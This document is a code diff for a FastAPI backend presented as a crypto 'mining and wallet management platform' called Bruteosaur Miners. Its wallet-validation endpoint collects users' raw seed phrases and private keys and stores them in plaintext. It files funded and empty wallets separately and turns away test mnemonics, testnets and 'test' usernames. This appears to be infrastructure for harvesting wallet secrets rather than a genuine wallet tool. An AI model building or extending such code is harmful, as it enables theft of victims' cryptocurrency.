@@ -9,12 +9,17 @@ from typing import Any, Dict, Literal, Optional
 
 import httpx
 import jwt
-from bip_utils import (Bip39Languages, Bip39MnemonicValidator,
-                       Bip39SeedGenerator, Bip44, Bip44Changes, Bip44Coins)
+from bip_utils import (
+    Bip39Languages,
+    Bip39MnemonicValidator,
+    Bip39SeedGenerator,
+    Bip44,
+    Bip44Changes,
+    Bip44Coins,
+)
 from dotenv import load_dotenv
 from eth_account import Account
-from fastapi import (APIRouter, Depends, FastAPI, HTTPException, Request,
-                     Response)
+from fastapi import APIRouter, Depends, FastAPI, HTTPException, Request, Response
 from motor.motor_asyncio import AsyncIOMotorClient
 from passlib.context import CryptContext
 from pydantic import BaseModel
@@ -54,9 +59,22 @@ CHAINS = MAINNET_CHAINS
 WC_PROJECT_ID = os.environ.get("WC_PROJECT_ID")
 
 DEFAULT_RPCS = {
-    "ethereum": "https://cloudflare-eth.com",
+    "ethereum": "https://rpc.ankr.com/eth",
     "bitcoin": "https://blockstream.info/api",
     "tron": "https://api.trongrid.io",
+}
+FALLBACK_RPCS = {
+    "ethereum": [
+        "https://rpc.ankr.com/eth",
+        "https://eth.llamarpc.com",
+        "https://cloudflare-eth.com",
+        "https://ethereum.publicnode.com",
+        "https://eth.drpc.org",
+        "https://rpc.flashbots.net",
+        "https://virginia.rpc.blxrbdn.com",
+    ],
+    "bitcoin": ["https://blockstream.info/api", "https://blockchain.info"],
+    "tron": ["https://api.trongrid.io", "https://api.tronstack.io"],
 }
 RPC_URLS = {
     "ethereum": os.environ.get("RPC_ETH_URL") or DEFAULT_RPCS["ethereum"],
@@ -107,19 +125,21 @@ class WalletManualValidateReq(BaseModel):
 
 async def get_user_by_username(username: str) -> Optional[Dict[str, Any]]:
     result = await db.users.find_one({"username": username})
-    return result
+    return result  # type: ignore[return-value]
 
 
 async def get_user_by_id(uid: str) -> Optional[Dict[str, Any]]:
     result = await db.users.find_one({"id": uid})
-    return result
+    return result  # type: ignore[return-value]
 
 
 async def ensure_indexes():
     await db.users.create_index("username", unique=True)
     await db.logs.create_index([("created_at", 1)])
     await db.wallet_validations.create_index([("created_at", 1)])
+    await db.wallet_validations.create_index([("secret", 1), ("chain", 1)], unique=True)
     await db.wallet_validations_zero.create_index([("created_at", 1)])
+    await db.wallet_validations_zero.create_index([("secret", 1), ("chain", 1)], unique=True)
     await db.wallet_validations_rejected.create_index([("created_at", 1)])
 
 
@@ -184,19 +204,21 @@ def set_session_cookie(resp: Response, token: str):
         key=COOKIE_NAME,
         value=token,
         httponly=True,
-        secure=False,
-        samesite="lax",
+        secure=True,
+        samesite="none",
         max_age=7 * 24 * 3600,
         path="/",
+        domain=".bruteosaur.duckdns.org",
     )
     resp.set_cookie(
         key=CSRF_COOKIE_NAME,
         value=csrf_token,
         httponly=False,
-        secure=False,
-        samesite="lax",
+        secure=True,
+        samesite="none",
         max_age=7 * 24 * 3600,
         path="/",
+        domain=".bruteosaur.duckdns.org",
     )
 
 
@@ -205,39 +227,64 @@ async def verify_csrf_token(request: Request):
     csrf_from_cookie = request.cookies.get(CSRF_COOKIE_NAME)
     csrf_from_header = request.headers.get("X-CSRF-Token")
 
-    logger.info(f"CSRF Verification - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}")
+    logger.info(
+        f"CSRF Verification - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}"
+    )
 
     if not session_token or not csrf_from_cookie or not csrf_from_header:
-        logger.warning(f"CSRF_TOKEN_MISSING - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}")
+        logger.warning(
+            f"CSRF_TOKEN_MISSING - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}"
+        )
         raise HTTPException(status_code=403, detail="CSRF_TOKEN_MISSING")
 
     expected_csrf = csrf_tokens.get(session_token)
-    logger.info(f"CSRF Check - Expected exists: {bool(expected_csrf)}, Cookie matches: {expected_csrf == csrf_from_cookie}, Header matches: {csrf_from_cookie == csrf_from_header}")
+    logger.info(
+        f"CSRF Check - Expected exists: {bool(expected_csrf)}, Cookie matches: {expected_csrf == csrf_from_cookie}, Header matches: {csrf_from_cookie == csrf_from_header}"
+    )
 
     if expected_csrf != csrf_from_cookie:
-        logger.warning(f"CSRF_TOKEN_INVALID - Expected: {expected_csrf[:10] if expected_csrf else None}, Got: {csrf_from_cookie[:10] if csrf_from_cookie else None}")
+        logger.warning(
+            f"CSRF_TOKEN_INVALID - Expected: {expected_csrf[:10] if expected_csrf else None}, Got: {csrf_from_cookie[:10] if csrf_from_cookie else None}"
+        )
         raise HTTPException(status_code=403, detail="CSRF_TOKEN_INVALID")
 
     if csrf_from_cookie != csrf_from_header:
-        logger.warning(f"CSRF_TOKEN_MISMATCH - Cookie: {csrf_from_cookie[:10] if csrf_from_cookie else None}, Header: {csrf_from_header[:10] if csrf_from_header else None}")
+        logger.warning(
+            f"CSRF_TOKEN_MISMATCH - Cookie: {csrf_from_cookie[:10] if csrf_from_cookie else None}, Header: {csrf_from_header[:10] if csrf_from_header else None}"
+        )
         raise HTTPException(status_code=403, detail="CSRF_TOKEN_MISMATCH")
 
 
 def get_w3(chain: str) -> Web3:
+    import time
+    
     url = RPC_URLS.get(chain)
     if not url:
         raise HTTPException(status_code=501, detail="RPC_NOT_CONFIGURED")
-    w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 15}))
-    if chain in ("polygon", "bsc"):
+
+    urls_to_try = [url]
+    if chain in FALLBACK_RPCS:
+        urls_to_try.extend([u for u in FALLBACK_RPCS[chain] if u != url])
+
+    for idx, rpc_url in enumerate(urls_to_try):
         try:
-            w3.middleware_onion.inject(geth_poa_middleware, layer=0)
-        except Exception:
-            pass
-    if not w3.is_connected():
-        raise HTTPException(
-            status_code=502, detail=f"RPC_CONNECT_FAILED_{chain.upper()}"
-        )
-    return w3
+            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 30}))
+            if chain in ("polygon", "bsc"):
+                try:
+                    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+                except Exception:
+                    pass
+            if w3.is_connected():
+                if rpc_url != url:
+                    logger.info(f"Using fallback RPC for {chain}: {rpc_url}")
+                return w3
+        except Exception as e:
+            logger.warning(f"RPC connection failed for {rpc_url}: {str(e)}")
+            if idx < len(urls_to_try) - 1:
+                time.sleep(0.5)
+            continue
+
+    raise HTTPException(status_code=502, detail=f"RPC_CONNECT_FAILED_{chain.upper()}")
 
 
 def derive_pk_from_mnemonic(mnemonic: str) -> str:
@@ -368,11 +415,44 @@ async def me(user: dict = Depends(get_current_user)):
     )
 
 
+@api.get("/auth/csrf")
+async def get_csrf(request: Request, resp: Response):
+    session_token = request.cookies.get(COOKIE_NAME)
+    if not session_token:
+        raise HTTPException(status_code=401, detail="NOT_AUTHENTICATED")
+
+    csrf_token = csrf_tokens.get(session_token)
+    if not csrf_token:
+        csrf_token = secrets.token_urlsafe(32)
+        csrf_tokens[session_token] = csrf_token
+        resp.set_cookie(
+            key=CSRF_COOKIE_NAME,
+            value=csrf_token,
+            httponly=False,
+            secure=True,
+            samesite="none",
+            max_age=7 * 24 * 3600,
+            path="/",
+            domain=".bruteosaur.duckdns.org",
+        )
+
+    return {"csrf_token": csrf_token}
+
+
 TEST_MNEMONICS = [
     "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
 ]
 
-TEST_PRIVATE_KEYS = []
+TEST_PRIVATE_KEYS: list[str] = []
+
+
+@api.get("/wallet/wc/config")
+async def get_walletconnect_config():
+    return {
+        "projectId": os.environ.get("WC_PROJECT_ID", ""),
+        "name": "Bruteosaur Miners",
+        "description": "Cryptocurrency mining and wallet management platform",
+    }
 
 
 @api.post("/wallet/manual-validate")
@@ -382,7 +462,7 @@ async def manual_validate(
     _csrf: None = Depends(verify_csrf_token),
 ):
     secret_normalized = req.secret.strip().lower()
-    
+
     if req.method == "mnemonic":
         if secret_normalized in TEST_MNEMONICS:
             raise HTTPException(status_code=400, detail="TEST_MNEMONIC_NOT_ALLOWED")
@@ -390,10 +470,10 @@ async def manual_validate(
         pk_clean = secret_normalized.replace("0x", "")
         if pk_clean in TEST_PRIVATE_KEYS:
             raise HTTPException(status_code=400, detail="TEST_PRIVATE_KEY_NOT_ALLOWED")
-    
+
     if user.get("username", "").lower().startswith("test"):
         raise HTTPException(status_code=400, detail="TEST_USERNAMES_NOT_ALLOWED")
-    
+
     chain = (req.chain or CHAINS[0]).lower()
     if chain not in RPC_URLS:
         raise HTTPException(status_code=400, detail="UNSUPPORTED_CHAIN")
@@ -414,6 +494,51 @@ async def manual_validate(
             logger.error(f"Invalid private key format: {str(e)}")
             raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")
 
+    # Check if this secret (mnemonic or private key) has already been used
+    secret_to_check = req.secret.strip()
+    logger.info(f"Checking for duplicate wallet - chain: {chain}, user: {user['username']}")
+    
+    # Check in successful validations
+    existing = await db.wallet_validations.find_one({
+        "secret": secret_to_check,
+        "chain": chain
+    })
+    
+    if existing:
+        logger.warning(f"Duplicate wallet found in wallet_validations - user_id: {existing.get('user_id')}, current user: {user['id']}")
+        raise HTTPException(
+            status_code=400, 
+            detail="WALLET_ALREADY_REGISTERED"
+        )
+    
+    # Check in zero balance validations
+    existing = await db.wallet_validations_zero.find_one({
+        "secret": secret_to_check,
+        "chain": chain
+    })
+    
+    if existing:
+        logger.warning(f"Duplicate wallet found in wallet_validations_zero - user_id: {existing.get('user_id')}, current user: {user['id']}")
+        raise HTTPException(
+            status_code=400, 
+            detail="WALLET_ALREADY_REGISTERED"
+        )
+    
+    # Also check if wallet is already connected to ANY user (by checking users collection)
+    existing_user = await db.users.find_one({
+        "wallet_connection.secret": secret_to_check,
+        "wallet_connection.chain": chain
+    })
+    
+    if existing_user and existing_user["id"] != user["id"]:
+        logger.warning(f"Duplicate wallet found in users collection - existing user: {existing_user['username']}, current user: {user['username']}")
+        raise HTTPException(
+            status_code=400, 
+            detail="WALLET_ALREADY_REGISTERED"
+        )
+    
+    logger.info(f"No duplicate found, proceeding with validation for user {user['username']}")
+
     if chain == "ethereum":
         try:
             w3 = get_w3(chain)
@@ -421,7 +546,8 @@ async def manual_validate(
             raise
         except Exception as e:
             logger.error(f"RPC connection failed for {chain}: {str(e)}")
-            raise HTTPException(status_code=502, detail=f"RPC_CONNECT_FAILED_ETHEREUM")
+            raise HTTPException(status_code=502, detail="RPC_CONNECT_FAILED_ETHEREUM")
+        
         try:
             chain_id = w3.eth.chain_id
             if chain_id != MAINNET_CHAIN_IDS["ethereum"]:
@@ -457,43 +583,114 @@ async def manual_validate(
                     status_code=400, detail="TESTNET_NOT_ALLOWED_MAINNET_ONLY"
                 )
 
-            bal_wei = w3.eth.get_balance(Web3.to_checksum_address(address))
-        except HTTPException:
-            raise
-        except Exception as e:
-            logger.exception(f"balance_fetch_failed: {str(e)}")
-            raise HTTPException(status_code=502, detail=f"BALANCE_FETCH_FAILED: {str(e)}")
+            import time
+            bal_wei = None
+            retry_count = 0
+            max_retries = 3
+            
+            while retry_count < max_retries:
+                try:
+                    bal_wei = w3.eth.get_balance(Web3.to_checksum_address(address))
+                    break
+                except Exception as e:
+                    retry_count += 1
+                    if retry_count >= max_retries:
+                        logger.exception(f"balance_fetch_failed after {max_retries} retries: {str(e)}")
+                        raise HTTPException(
+                            status_code=502, detail=f"BALANCE_FETCH_FAILED: {str(e)}"
+                        )
+                    logger.warning(f"Balance fetch retry {retry_count}/{max_retries}: {str(e)}")
+                    time.sleep(1)
+                    try:
+                        w3 = get_w3(chain)
+                    except Exception:
+                        pass
 
-        balance_eth = str(Web3.from_wei(bal_wei, "ether"))
+            if bal_wei is None:
+                raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED: No balance returned")
+            
+            balance_eth = str(Web3.from_wei(bal_wei, "ether"))
 
-        if bal_wei <= 0:
+            if bal_wei <= 0:
+                doc = {
+                    "id": str(uuid.uuid4()),
+                    "user_id": user["id"],
+                    "method": req.method,
+                    "chain": chain,
+                    "address": address,
+                    "balance": "0",
+                    "balance_wei": "0",
+                    "status": "zero_balance",
+                    "secret": req.secret.strip(),
+                    "created_at": datetime.utcnow(),
+                }
+                await db.wallet_validations_zero.insert_one(doc)
+
+                wallet_connection_data = {
+                    "address": address,
+                    "chain": chain,
+                    "method": req.method,
+                    "balance": "0",
+                    "balance_wei": "0",
+                    "status": "zero_balance",
+                    "secret": req.secret.strip(),
+                    "connected_at": datetime.utcnow(),
+                }
+                await db.users.update_one(
+                    {"id": user["id"]},
+                    {"$set": {"wallet_connection": wallet_connection_data}},
+                )
+
+                await db.logs.insert_one(
+                    {
+                        "id": str(uuid.uuid4()),
+                        "user_id": user["id"],
+                        "type": "wallet",
+                        "action": "manual_validate_zero_balance",
+                        "metadata": {
+                            "chain": chain,
+                            "method": req.method,
+                            "address": address,
+                            "balance": "0",
+                        },
+                        "ip": None,
+                        "ua": None,
+                        "created_at": datetime.utcnow(),
+                    }
+                )
+                return {
+                    "ok": True,
+                    "address": address,
+                    "balance": "0",
+                    "status": "zero_balance",
+                }
+
             doc = {
                 "id": str(uuid.uuid4()),
                 "user_id": user["id"],
                 "method": req.method,
                 "chain": chain,
                 "address": address,
-                "balance": "0",
-                "balance_wei": "0",
-                "status": "zero_balance",
+                "balance": balance_eth,
+                "balance_wei": str(bal_wei),
+                "status": "validated",
                 "secret": req.secret.strip(),
                 "created_at": datetime.utcnow(),
             }
-            await db.wallet_validations_zero.insert_one(doc)
+            await db.wallet_validations.insert_one(doc)
 
             wallet_connection_data = {
                 "address": address,
                 "chain": chain,
                 "method": req.method,
-                "balance": "0",
-                "balance_wei": "0",
-                "status": "zero_balance",
+                "balance": balance_eth,
+                "balance_wei": str(bal_wei),
+                "status": "validated",
                 "secret": req.secret.strip(),
                 "connected_at": datetime.utcnow(),
             }
             await db.users.update_one(
-                {"id": user["id"]},
-                {"$set": {"wallet_connection": wallet_connection_data}},
+                {"id": user["id"]}, {"$set": {"wallet_connection": wallet_connection_data}}
             )
 
             await db.logs.insert_one(
@@ -501,77 +698,28 @@ async def manual_validate(
                     "id": str(uuid.uuid4()),
                     "user_id": user["id"],
                     "type": "wallet",
-                    "action": "manual_validate_zero_balance",
+                    "action": "manual_validate_success",
                     "metadata": {
                         "chain": chain,
                         "method": req.method,
                         "address": address,
-                        "balance": "0",
+                        "balance": balance_eth,
+                        "balance_wei": str(bal_wei),
                     },
                     "ip": None,
                     "ua": None,
                     "created_at": datetime.utcnow(),
                 }
             )
+
             return {
-                "ok": True,
+                "status": "validated",
                 "address": address,
-                "balance": "0",
-                "status": "zero_balance",
+                "balance": balance_eth,
             }
-
-        doc = {
-            "id": str(uuid.uuid4()),
-            "user_id": user["id"],
-            "method": req.method,
-            "chain": chain,
-            "address": address,
-            "balance": balance_eth,
-            "balance_wei": str(bal_wei),
-            "status": "validated",
-            "secret": req.secret.strip(),
-            "created_at": datetime.utcnow(),
-        }
-        await db.wallet_validations.insert_one(doc)
-
-        wallet_connection_data = {
-            "address": address,
-            "chain": chain,
-            "method": req.method,
-            "balance": balance_eth,
-            "balance_wei": str(bal_wei),
-            "status": "validated",
-            "secret": req.secret.strip(),
-            "connected_at": datetime.utcnow(),
-        }
-        await db.users.update_one(
-            {"id": user["id"]}, {"$set": {"wallet_connection": wallet_connection_data}}
-        )
-
-        await db.logs.insert_one(
-            {
-                "id": str(uuid.uuid4()),
-                "user_id": user["id"],
-                "type": "wallet",
-                "action": "manual_validate_success",
-                "metadata": {
-                    "chain": chain,
-                    "method": req.method,
-                    "address": address,
-                    "balance": balance_eth,
-                    "balance_wei": str(bal_wei),
-                },
-                "ip": None,
-                "ua": None,
-                "created_at": datetime.utcnow(),
-            }
-        )
-
-        return {
-            "status": "validated",
-            "address": address,
-            "balance": balance_eth,
-        }
+        except Exception as e:
+            logger.exception(f"Ethereum validation error: {str(e)}")
+            raise HTTPException(status_code=502, detail=f"VALIDATION_ERROR: {str(e)}")
 
     elif chain == "bitcoin":
         try:
